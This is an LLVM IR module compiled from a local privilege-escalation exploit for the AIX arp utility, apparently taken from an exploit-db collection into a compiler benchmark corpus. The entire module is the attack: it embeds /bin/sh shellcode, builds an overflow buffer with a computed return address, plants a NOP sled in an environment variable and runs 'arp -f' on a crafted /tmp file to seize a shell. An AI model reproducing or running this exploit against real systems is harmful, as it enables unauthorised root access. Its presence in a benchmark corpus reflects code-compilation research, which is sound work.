; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19216.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19216.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [93 x i8] c"\EBE\9A\FF\FF\FF\FF\07\FF\C3^1\C0\89F\B7\88F\BC\88F\07\89F\0C1\C0\B0/\E8\E0\FF\FF\FFRR1\C0\B0\CB\E8\D5\FF\FF\FF\83\C4\081\C0P\8D^\08S\8D\1E\89^\08S\B0;\E8\BE\FF\FF\FF\83\C4\0C\E8\BE\FF\FF\FF/bin/sh\FF\FF\FF\FF\FF\FF\FF\FF\FF\00", align 16
@.str = private unnamed_addr constant [9 x i8] c"/tmp/ypx\00", align 1
@O_CREAT = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"1 2 3 4 \00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"LOL=\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"/usr/sbin/arp -f /tmp/ypx\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [93 x i8], align 16
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca [300 x i8], align 16
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = bitcast [93 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([93 x i8], [93 x i8]* @__const.main.shell, i32 0, i32 0), i64 93, i1 false)
  store i64 134511480, i64* %7, align 8
  %12 = call i32 (...) @get_esp()
  %13 = add nsw i32 %12, 600
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %8, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp eq i32 %15, 2
  br i1 %16, label %17, label %24

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i64 @atoi(i8* %20)
  %22 = load i64, i64* %8, align 8
  %23 = add i64 %22, %21
  store i64 %23, i64* %8, align 8
  br label %24

24:                                               ; preds = %17, %2
  %25 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %26 = call i32 @memset(i8* %25, i32 97, i32 300)
  %27 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %28 = getelementptr inbounds i8, i8* %27, i64 52
  %29 = call i32 (i8*, ...) @memcpy(i8* %28, i64* %7, i32 4)
  %30 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %31 = getelementptr inbounds i8, i8* %30, i64 76
  %32 = call i32 (i8*, ...) @memcpy(i8* %31, i64* %8, i32 4)
  %33 = load i32, i32* @O_CREAT, align 4
  %34 = load i32, i32* @O_WRONLY, align 4
  %35 = or i32 %33, %34
  %36 = call i32 @open(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 %35, i32 384)
  store i32 %36, i32* %10, align 4
  %37 = load i32, i32* %10, align 4
  %38 = call i32 (i32, ...) @write(i32 %37, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i32 8)
  %39 = load i32, i32* %10, align 4
  %40 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %41 = call i32 (i32, ...) @write(i32 %39, i8* %40, i64 300)
  %42 = load i32, i32* %10, align 4
  %43 = call i32 @close(i32 %42)
  %44 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %45 = call i32 @memset(i8* %44, i32 144, i32 300)
  %46 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %47 = call i32 (i8*, ...) @memcpy(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 4)
  %48 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %49 = getelementptr inbounds [93 x i8], [93 x i8]* %6, i64 0, i64 0
  %50 = call i32 @strlen(i8* %49)
  %51 = sext i32 %50 to i64
  %52 = sub i64 300, %51
  %53 = getelementptr inbounds i8, i8* %48, i64 %52
  %54 = getelementptr inbounds [93 x i8], [93 x i8]* %6, i64 0, i64 0
  %55 = getelementptr inbounds [93 x i8], [93 x i8]* %6, i64 0, i64 0
  %56 = call i32 @strlen(i8* %55)
  %57 = call i32 (i8*, ...) @memcpy(i8* %53, i8* %54, i32 %56)
  %58 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %59 = call i32 @putenv(i8* %58)
  %60 = call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  %61 = call i32 @unlink(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  %62 = load i32, i32* %3, align 4
  ret i32 %62
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @get_esp(...) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i32 @open(i8*, i32, i32) #2

declare dso_local i32 @write(i32, ...) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @unlink(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
